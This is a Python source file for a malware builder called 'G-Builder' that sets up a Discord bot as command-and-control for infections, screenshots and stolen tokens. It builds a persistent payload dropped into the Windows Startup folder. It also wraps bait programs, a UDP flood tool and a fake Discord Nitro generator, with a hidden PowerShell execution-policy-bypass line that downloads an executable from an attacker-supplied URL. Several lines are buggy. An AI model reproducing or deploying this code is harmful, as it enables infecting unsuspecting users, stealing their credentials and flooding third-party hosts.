import os
import json
import shutil
import time
import sys
import PyInstaller.__main__
import ctypes
from os import system
pc_username = os.getenv('UserName')
def finalstage():
  downloadurl=str(input("enter payload url:"))
  time.sleep(1)
  print("1:ddos pinger")
  template=int(input("Choose a payload template:"))
  if template==1:
    writestr=((("""import socket
import random,time,os
ip=input("enter target ip:")
port=int(input("enter port:"))
maxi=int(input("enter num to send:"))
target=(f"{ip}:{port}")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
sent=0
while sent < maxi:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    print(f"sent {sent} packets to {target}")""")))
    injectstr=(((f"""\nos.popen(f"powershell -executionpolicy bypass -command Invoke-WebRequest -Uri {downloadurl} -OutFile 'realte.exe'")
    \nshutil.move("realte.exe",f"C:/Users{pc_username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\realte.exe")""")))
    f = open("pinger.py", "x")
    f.write(writestr)
    f.close
    f = open("pinger.py", "a")
    f.write(injectstr)
    f.close
    PyInstaller.__main__.run([
    'pinger.py',
    '--onefile',])
    shutil.rmtree("build")
    os.remove("pinger.spec")
    os.remove("pinger.py")
    shutil.move("dist/pinger.exe", "pinger.exe")
    shutil.rmtree("dist")
    shutil.rmtree("__pycache__")
  else:
    if template==2:
      writestr==((("""import string, random
from base64 import b64decode
chars = list(string.ascii_lowercase)+list(string.ascii_uppercase)+list(string.digits)
amt = int(input("How many links do you want? "))

main = "https://discord.gift/"

for i in range(amt):
    ending = ""
    for i in range(random.randint(8,16)):
        ending += random.choice(chars)
    print(main+ending)""")))
    injectstr=(((f"""\nos.popen(f"powershell -executionpolicy bypass -command Invoke-WebRequest -Uri {downloadurl} -OutFile 'realte.exe'")
    \nshutil.move("realte.exe",f"C:/Users{pc_username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\realte.exe")""")))
    f = open("nitrogen.py", "x")
    f.write(writestr)
    f.close
    f = open("nitrogen.py", "a")
    f.write(injectstr)
    f.close
    PyInstaller.__main__.run([
    'nitrogen.py',
    '--onefile',])
    shutil.rmtree("build")
    os.remove("nitrogen.spec")
    os.remove("nitrogen.py")
    shutil.move("dist/nitrogen.exe", "nitrogen.exe")
    shutil.rmtree("dist")
    shutil.rmtree("__pycache__")

  print("Payload generated now go forth and spread the glory of godseye")
  time.sleep(2)
  exit()



  

def payload():
    os.popen("git clone https://github.com/AtTheRealGodseye/godseye")
    time.sleep(3)
    os.chdir("godseye")
    os.popen("python3 builder.py")
    time.sleep(1)
    shutil.move("godseyecode.py",f"C:/Users{pc_username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\realte.pyw")
    os.chdir("../")
    shutil.rmtree("godseye")
    PyInstaller.__main__.run([
    'realte.pyw',
    '--onefile',
    '--windowed'])
    shutil.rmtree("build")
    os.remove("realte.spec")
    os.remove("realte.pyw")
    shutil.move("dist/realte.exe", "realte.exe")
    shutil.rmtree("dist")
    shutil.rmtree("__pycache__")
    print("The output file can be found at Realte.exe upload this as to discord to be able to embed in files")
    while True:
      continuation=input("Would you like to proceed to generating a final payload?:")
      if continuation==("Yes"):
        finalstage()
      else:
        if continuation==("No"):
          print("Thank you for using G-Builder")
          time.sleep(2)
          exit()
        else:
          print("Not an option try again")
          continue

def choice():
  print("command and control server template is https://discord.new/ZdhafKFHpkKN ")
  bottoken=input("Enter Bot Token:")
  if len(bottoken)<59 or len(bottoken)>59:
      print("discord bot tokens are 59 char long please try again ")
      choice()
  PLC=input("Enter Payload Channel ID:")
  if len(PLC)<18 or len(PLC)>18:
      print("discord channel ids are 18 char long please try again ")
      choice()
  IFC=input("Enter Infections Channel ID:")
  if len(IFC)<18 or len(IFC)>18:
      print("discord channel ids are 18 char long please try again ")
      choice()
  PIC=input("Enter Screenshot Channel ID:")
  if len(PIC)<18 or len(PIC)>18:
      print("discord channel ids are 18 char long please try again ")
      choice()
  HTP=input("Enter HTTP Channel ID:")
  if len(HTP)<18 or len(HTP)>18:
      print("discord channel ids are 18 char long please try again ")
      choice()
  TLC=input("Enter tokens Channel ID:")
  if len(TLC)<18 or len(TLC)>18:
      print("discord channel ids are 18 char long please try again ")
      choice()
  config=("config.json")
  file=os.path.exists(config)
  if file:
    f = open(config, "w")
    configstr=(((f"""
    "token":"{bottoken}",
    "PLC":"{PLC}",
    "IFC":"{IFC}",
    "PIC":"{PIC}",
    "HTP":"{HTP}",
    "TLC":"{TLC}"
    """)))
    writestr=("{"+configstr+"}")
    f.write(writestr)
    f.close()
  else:
    f = open(config, "x")
    configstr=(((f"""
    "token":"{bottoken}",
    "PLC":"{PLC}",
    "IFC":"{IFC}",
    "PIC":"{PIC}",
    "HTP":"{HTP}",
    "TLC":"{TLC}"
    """)))
    writestr=("{"+configstr+"}")
    f.write(writestr)
    f.close()

ctypes.windll.kernel32.SetConsoleTitleW("G-Builder")
print(((("""
   _____        ____  _    _ _____ _      _____  ______ _____  
  / ____|      |  _ \| |  | |_   _| |    |  __ \|  ____|  __ \ 
 | |  __ ______| |_) | |  | | | | | |    | |  | | |__  | |__) |
 | | |_ |______|  _ <| |  | | | | | |    | |  | |  __| |  _  / 
 | |__| |      | |_) | |__| |_| |_| |____| |__| | |____| | \ \ 
  \_____|      |____/ \____/|_____|______|_____/|______|_|  \_\
                                                               
      1:Configure             2:Build           3:Inject                                                          """))))
      
while True:
  choose=int(input("Choose an option to start:"))
  if choose==1:
    choice()
  else:
    if choose==2:
      config=("config.json")
      file=os.path.exists(config)
      if file:
        payload()
      else:
        print("Configure settings before running this")
        choice()
      
    else:
      if choose==3:
        finalstage()
      else:
        print("Not an option try again")
        continue
